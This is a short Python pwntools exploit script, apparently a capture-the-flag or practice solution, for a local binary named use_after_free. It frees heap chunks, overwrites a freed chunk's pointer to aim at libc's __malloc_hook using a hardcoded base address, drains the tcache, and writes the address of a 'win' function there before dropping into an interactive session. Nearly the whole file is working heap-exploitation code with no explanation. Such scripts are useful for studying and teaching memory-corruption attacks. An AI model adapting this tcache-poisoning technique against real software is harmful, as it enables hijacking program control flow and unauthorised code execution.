#!/usr/bin/python3
from pwn import *
#context.log_level='DEBUG'

p = process("./use_after_free", env={"LD_PRELOAD":"./libc.so.6"})
elf = ELF("./use_after_free", checksec=False)
libc = elf.libc

END_OF_MENU = b"e.g, l\n"

def malloc(size):
	p.send(b"m %d" % size)
	p.recvuntil(END_OF_MENU)

def free(idx):
	p.send(b"f %d" % idx)
	p.recvuntil(END_OF_MENU)

def edit(idx, data):
	p.send(b"e %d %b" % (idx, data))
	p.recvuntil(END_OF_MENU)

def list():
	p.send("l")
	pointers = p.recvline()
	log.info(pointers)
	p.recvuntil(END_OF_MENU)

if __name__=="__main__":

	pause()
	for i in range(10):
		malloc(24) # 0 -> 9

	for i in range(10):
		free(i)

	base_addr = 0x7f2af5093000
	victim_mem = base_addr + elf.libc.symbols['__malloc_hook']
	fake_chunk = victim_mem - 0x10
	edit(9, p64(fake_chunk))
	# empty tcache
	for _ in range(7):
		malloc(24) # 10 -> 16
	malloc(24)
	malloc(24)
	malloc(24)
	edit(18, p64(elf.symbols['win']))

	p.interactive()
